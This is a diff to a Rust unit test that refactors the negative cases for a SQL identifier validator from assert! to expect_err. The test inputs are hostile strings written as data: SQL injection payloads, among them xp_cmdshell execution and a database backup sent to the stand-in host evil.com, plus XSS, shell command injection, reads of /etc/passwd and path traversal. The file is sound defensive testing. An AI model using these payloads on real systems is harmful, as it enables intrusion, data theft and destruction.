@@ -164,130 +164,120 @@ mod tests {
     use super::*;
 
     #[test]
-    #[allow(clippy::too_many_lines)]
+    #[expect(clippy::too_many_lines)]
     fn test_validate_identifier() {
         // Valid identifiers
-        assert!(validate_identifier("valid_identifier").is_ok());
-        assert!(validate_identifier("test.one.two").is_ok());
-        assert!(validate_identifier("\"test\".foo.bar").is_ok());
-        assert!(validate_identifier("a1").is_ok());
-        assert!(validate_identifier("_underscore").is_ok());
-        assert!(validate_identifier("camelCase").is_ok());
-        assert!(validate_identifier("PascalCase").is_ok());
-        assert!(validate_identifier("snake_case_123").is_ok());
-        assert!(validate_identifier("\"quoted.identifier\"").is_ok());
-        assert!(validate_identifier("db.schema.table").is_ok());
-        assert!(validate_identifier("schema.table").is_ok());
-        assert!(validate_identifier("valid@identifier").is_ok());
+        validate_identifier("valid_identifier").expect("should validate successfully");
+        validate_identifier("test.one.two").expect("should validate successfully");
+        validate_identifier("\"test\".foo.bar").expect("should validate successfully");
+        validate_identifier("a1").expect("should validate successfully");
+        validate_identifier("_underscore").expect("should validate successfully");
+        validate_identifier("camelCase").expect("should validate successfully");
+        validate_identifier("PascalCase").expect("should validate successfully");
+        validate_identifier("snake_case_123").expect("should validate successfully");
+        validate_identifier("\"quoted.identifier\"").expect("should validate successfully");
+        validate_identifier("db.schema.table").expect("should validate successfully");
+        validate_identifier("schema.table").expect("should validate successfully");
+        validate_identifier("valid@identifier").expect("should validate successfully");
 
         // Invalid identifiers
-        assert!(
-            validate_identifier("sneaky\"; CREATE TABLE foo (id int); -- putting comments!")
-                .is_err()
-        );
-        assert!(validate_identifier("validate your inputs!").is_err());
-        assert!(validate_identifier("").is_err());
-        assert!(validate_identifier(" ").is_err());
-        assert!(validate_identifier("1invalid").is_err());
-        assert!(validate_identifier("invalid-identifier").is_err());
-        assert!(validate_identifier("invalid:identifier").is_err());
-        assert!(validate_identifier("invalid/identifier").is_err());
-        assert!(validate_identifier("invalid\\identifier").is_err());
-        assert!(validate_identifier("invalid.").is_err());
-        assert!(validate_identifier(".invalid").is_err());
-        assert!(validate_identifier("invalid..identifier").is_err());
-        assert!(validate_identifier("\"unclosed.quote").is_err());
-        assert!(validate_identifier("closed.\"quote\"unclosed.\"quote").is_err());
+        validate_identifier("sneaky\"; CREATE TABLE foo (id int); -- putting comments!")
+            .expect_err("should error parsing identifier");
+        validate_identifier("validate your inputs!").expect_err("should error parsing identifier");
+        validate_identifier("").expect_err("should error parsing identifier");
+        validate_identifier(" ").expect_err("should error parsing identifier");
+        validate_identifier("1invalid").expect_err("should error parsing identifier");
+        validate_identifier("invalid-identifier").expect_err("should error parsing identifier");
+        validate_identifier("invalid:identifier").expect_err("should error parsing identifier");
+        validate_identifier("invalid/identifier").expect_err("should error parsing identifier");
+        validate_identifier("invalid\\identifier").expect_err("should error parsing identifier");
+        validate_identifier("invalid.").expect_err("should error parsing identifier");
+        validate_identifier(".invalid").expect_err("should error parsing identifier");
+        validate_identifier("invalid..identifier").expect_err("should error parsing identifier");
+        validate_identifier("\"unclosed.quote").expect_err("should error parsing identifier");
+        validate_identifier("closed.\"quote\"unclosed.\"quote")
+            .expect_err("should error parsing identifier");
 
         // SQL injection attack attempts
-        assert!(validate_identifier("users; DROP TABLE users;").is_err());
-        assert!(validate_identifier("admin'--").is_err());
-        assert!(validate_identifier("user' OR '1'='1").is_err());
-        assert!(validate_identifier("user\"; SELECT * FROM secrets; --").is_err());
-        assert!(validate_identifier("user'); DELETE FROM users; --").is_err());
-        assert!(validate_identifier("user\\\"; TRUNCATE TABLE logs; --").is_err());
-        assert!(
-            validate_identifier("user/**/UNION/**/SELECT/**/password/**/FROM/**/users").is_err()
-        );
-        assert!(
-            validate_identifier(
-                "user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user' AND 1=CONVERT(int,(SELECT @@version)); --").is_err());
-        assert!(validate_identifier("user' AND 1=1 WAITFOR DELAY '0:0:10'--").is_err());
-        assert!(validate_identifier("user'); EXEC xp_cmdshell('net user'); --").is_err());
-        assert!(
-            validate_identifier(
-                "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user' ORDER BY 1--").is_err());
-        assert!(validate_identifier("user' GROUP BY 1--").is_err());
-        assert!(validate_identifier("user' HAVING 1=1--").is_err());
-        assert!(
-            validate_identifier(
-                "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--"
-            )
-            .is_err()
-        );
-        assert!(
-            validate_identifier(
-                "user'; UPDATE users SET admin = true WHERE username = 'hacker';--"
-            )
-            .is_err()
-        );
-        assert!(
-            validate_identifier("user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--")
-                .is_err()
-        );
-        assert!(validate_identifier("user'; CREATE TRIGGER malicious_trigger AFTER INSERT ON users BEGIN /* malicious code */;--").is_err());
-        assert!(validate_identifier("user'; LOAD_FILE('/etc/passwd');--").is_err());
-        assert!(validate_identifier("user'; SELECT @@datadir;--").is_err());
-        assert!(validate_identifier("user' UNION SELECT NULL,NULL,SLEEP(5)--").is_err());
-        assert!(validate_identifier("user' AND (SELECT COUNT(*) FROM users) > 0--").is_err());
-        assert!(
-            validate_identifier(
-                "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user'; DECLARE @cmd VARCHAR(255); SET @cmd = 'dir c:'; EXEC master..xp_cmdshell @cmd;--").is_err());
-        assert!(
-            validate_identifier(
-                "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--").is_err());
-        assert!(
-            validate_identifier("user'; CREATE USER hacker IDENTIFIED BY 'password';--").is_err()
-        );
-        assert!(
-            validate_identifier("user'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--").is_err()
-        );
+        validate_identifier("users; DROP TABLE users;")
+            .expect_err("should error parsing identifier");
+        validate_identifier("admin'--").expect_err("should error parsing identifier");
+        validate_identifier("user' OR '1'='1").expect_err("should error parsing identifier");
+        validate_identifier("user\"; SELECT * FROM secrets; --")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user'); DELETE FROM users; --")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user\\\"; TRUNCATE TABLE logs; --")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user/**/UNION/**/SELECT/**/password/**/FROM/**/users")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user' AND 1=CONVERT(int,(SELECT @@version)); --")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user' AND 1=1 WAITFOR DELAY '0:0:10'--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user'); EXEC xp_cmdshell('net user'); --")
+            .expect_err("should error parsing identifier");
+        validate_identifier(
+            "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        )
+        .expect_err("should error parsing identifier");
+        validate_identifier("user' ORDER BY 1--").expect_err("should error parsing identifier");
+        validate_identifier("user' GROUP BY 1--").expect_err("should error parsing identifier");
+        validate_identifier("user' HAVING 1=1--").expect_err("should error parsing identifier");
+        validate_identifier(
+            "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--",
+        )
+        .expect_err("should error parsing identifier");
+        validate_identifier("user'; UPDATE users SET admin = true WHERE username = 'hacker';--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user'; CREATE TRIGGER malicious_trigger AFTER INSERT ON users BEGIN /* malicious code */;--").expect_err("should error parsing identifier");
+        validate_identifier("user'; LOAD_FILE('/etc/passwd');--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user'; SELECT @@datadir;--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user' UNION SELECT NULL,NULL,SLEEP(5)--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user' AND (SELECT COUNT(*) FROM users) > 0--")
+            .expect_err("should error parsing identifier");
+        validate_identifier(
+            "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--",
+        )
+        .expect_err("should error parsing identifier");
+        validate_identifier("user'; DECLARE @cmd VARCHAR(255); SET @cmd = 'dir c:'; EXEC master..xp_cmdshell @cmd;--").expect_err("should error parsing identifier");
+        validate_identifier(
+            "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--",
+        )
+        .expect_err("should error parsing identifier");
+        validate_identifier("user' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--").expect_err("should error parsing identifier");
+        validate_identifier("user'; CREATE USER hacker IDENTIFIED BY 'password';--")
+            .expect_err("should error parsing identifier");
+        validate_identifier("user'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--")
+            .expect_err("should error parsing identifier");
 
         // XSS-like attempts
-        assert!(validate_identifier("<script>alert('XSS')</script>").is_err());
-        assert!(validate_identifier("javascript:alert('XSS')").is_err());
-        assert!(
-            validate_identifier("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")
-                .is_err()
-        );
+        validate_identifier("<script>alert('XSS')</script>")
+            .expect_err("should error parsing identifier");
+        validate_identifier("javascript:alert('XSS')")
+            .expect_err("should error parsing identifier");
+        validate_identifier("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")
+            .expect_err("should error parsing identifier");
 
         // Command injection attempts
-        assert!(validate_identifier("user; cat /etc/passwd").is_err());
-        assert!(validate_identifier("user && whoami").is_err());
-        assert!(validate_identifier("user | netstat -an").is_err());
-        assert!(validate_identifier("user` echo vulnerable`").is_err());
+        validate_identifier("user; cat /etc/passwd").expect_err("should error parsing identifier");
+        validate_identifier("user && whoami").expect_err("should error parsing identifier");
+        validate_identifier("user | netstat -an").expect_err("should error parsing identifier");
+        validate_identifier("user` echo vulnerable`").expect_err("should error parsing identifier");
 
         // Null byte injection
-        assert!(validate_identifier("user\0malicious").is_err());
+        validate_identifier("user\0malicious").expect_err("should error parsing identifier");
 
         // Path traversal attempts
-        assert!(validate_identifier("../../../etc/passwd").is_err());
-        assert!(validate_identifier("..\\..\\..\\Windows\\System32").is_err());
+        validate_identifier("../../../etc/passwd").expect_err("should error parsing identifier");
+        validate_identifier("..\\..\\..\\Windows\\System32")
+            .expect_err("should error parsing identifier");
     }
 }
